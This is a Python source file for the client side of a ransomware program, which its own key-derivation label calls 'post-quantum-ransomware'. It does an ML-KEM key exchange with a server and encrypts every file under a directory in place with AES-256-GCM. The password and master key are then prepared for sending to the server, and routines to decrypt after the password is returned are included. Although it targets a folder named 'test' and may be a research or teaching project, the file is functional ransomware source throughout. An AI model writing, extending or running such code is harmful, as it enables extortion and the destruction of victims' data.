import os
import secrets
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.keywrap import aes_key_wrap, aes_key_unwrap
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import encrypt

DICTIONARY_PATH = "/usr/share/dict/words"
DIRECTORY_NAME = "test"
KEY_SIZE = 32  # 256 bits for AES-256
WRAPPED_KEY_SIZE = 40  # AES Key Wrap adds 8 bytes of overhead to 32-byte key
IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
TAG_SIZE = 16  # AES-GCM standard tag size (128 bits)
SALT_SIZE = 16  # Size of the salt for Argon2id


class Client:

    server_public_key: bytes
    communication_key: bytes

    def __init__(self, server_public_key: bytes):
        self.server_public_key = server_public_key

    def establish_shared_secret(self) -> tuple[bytes, bytes]:
        """
        Establish a shared secret with the server using ML-KEM.

        :param self: The Client instance.
        :return: A tuple containing the ciphertext and the original plaintext shared secret.
        :rtype: tuple[bytes, bytes]
        """

        ciphertext, plaintext_original = encrypt(self.server_public_key)

        return ciphertext, plaintext_original

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Client instance.
        :param shared_secret: The shared secret established with the server.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=KEY_SIZE,
            salt=None,
            info=b"post-quantum-ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def get_random_password(self) -> str:
        """
        Get a random password from the dictionary file.

        :param self: The Client instance.
        :return: The random password.
        :rtype: str
        """

        if not os.path.exists(DICTIONARY_PATH):
            raise FileNotFoundError(f"Dictionary file not found at {DICTIONARY_PATH}")

        with open(DICTIONARY_PATH, "r", encoding="utf-8") as f:
            words = f.read().splitlines()

        password = secrets.choice(words).strip()

        return password

    def derive_password_key(self, password: str, salt: bytes) -> bytes:
        """
        Derive a key from the password using Argon2id.
        :param self: The Client instance.
        :param password: The password to derive the key from.
        :param salt: The salt to use for key derivation.
        :return: The derived password key.
        :rtype: bytes
        """

        kdf = Argon2id(
            salt=salt,
            length=KEY_SIZE,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )

        password_key = kdf.derive(bytes(password, "utf-8"))

        return password_key

    def encrypt_file(self, file_path: str, master_key: bytes):
        """
        Encrypt a file using AES-256-GCM and replace its content with the wrapped key, IV, tag, and ciphertext.

        :param self: The Client instance.
        :param file_path: The path to the file to encrypt.
        :return: None
        """

        key = os.urandom(KEY_SIZE)
        iv = os.urandom(IV_SIZE)

        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
        ).encryptor()

        with open(file_path, "rb") as f:
            plaintext = f.read()

        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag
        wrapped_key = aes_key_wrap(master_key, key)

        with open(file_path, "wb") as f:
            f.write(wrapped_key + iv + tag + ciphertext)

    def encrypt_files(self) -> tuple[dict, dict]:
        """
        Encrypt all files in the specified directory and store the wrapped master key in a binary file.

        :param self: The Client instance.
        :return: A tuple containing the encrypted password and encrypted master key to send to the server.
        """

        password = self.get_random_password()
        master_key = os.urandom(KEY_SIZE)

        for root, _, files in os.walk(DIRECTORY_NAME):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path, master_key)

        salt = os.urandom(SALT_SIZE)
        password_key = self.derive_password_key(password, salt)
        wrapped_master_key = aes_key_wrap(password_key, master_key)

        with open(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.bin", "wb") as f:
            f.write(salt + wrapped_master_key)

        # Encrypt password to send to server
        iv = os.urandom(IV_SIZE)
        encryptor = Cipher(
            algorithms.AES(self.communication_key),
            modes.GCM(iv),
        ).encryptor()
        ciphertext = (
            encryptor.update(bytearray(password, "utf-8")) + encryptor.finalize()
        )
        tag = encryptor.tag
        encrypted_password = dict(iv=iv, ciphertext=ciphertext, tag=tag)

        # Encrypt master key to send to server
        iv = os.urandom(IV_SIZE)
        encryptor = Cipher(
            algorithms.AES(self.communication_key),
            modes.GCM(iv),
        ).encryptor()
        ciphertext = encryptor.update(master_key) + encryptor.finalize()
        tag = encryptor.tag
        encrypted_master_key = dict(iv=iv, ciphertext=ciphertext, tag=tag)

        return encrypted_password, encrypted_master_key

    def get_wrapped_file_key(self, file_path: str) -> bytes:
        """
        Retrieve the wrapped file key from the encrypted file.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :return: The wrapped file key.
        :rtype: bytes
        """

        with open(file_path, "rb") as f:
            wrapped_key = f.read(WRAPPED_KEY_SIZE)

        return wrapped_key

    def decrypt_file(self, file_path: str, file_key: bytes):
        """
        Decrypt a file using AES-256-GCM and replace its content with the plaintext.

        :param self: The Client instance.
        :param file_path: The path to the file to decrypt.
        :param file_key: The key to decrypt the file.
        :return: None
        """

        with open(file_path, "rb") as f:
            f.read(WRAPPED_KEY_SIZE)  # Skip wrapped key
            iv = f.read(IV_SIZE)
            tag = f.read(TAG_SIZE)
            ciphertext = f.read()

        decryptor = Cipher(
            algorithms.AES(file_key),
            modes.GCM(iv, tag),
        ).decryptor()

        plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        with open(file_path, "wb") as f:
            f.write(plaintext)

    def decrypt_files(self, password: str):
        """
        Decrypt all files in the specified directory using the provided password.

        :param self: The Client instance.
        :param password: The password to derive the key for decryption.
        :return: None
        """

        with open(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.bin", "rb") as f:
            salt = f.read(SALT_SIZE)
            wrapped_master_key = f.read()

        password_key = self.derive_password_key(password, salt)
        master_key = aes_key_unwrap(password_key, wrapped_master_key)

        for root, _, files in os.walk(DIRECTORY_NAME):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path == f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.bin":
                    continue
                wrapped_file_key = self.get_wrapped_file_key(file_path)
                file_key = aes_key_unwrap(master_key, wrapped_file_key)
                self.decrypt_file(file_path, file_key)

        os.remove(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.bin")
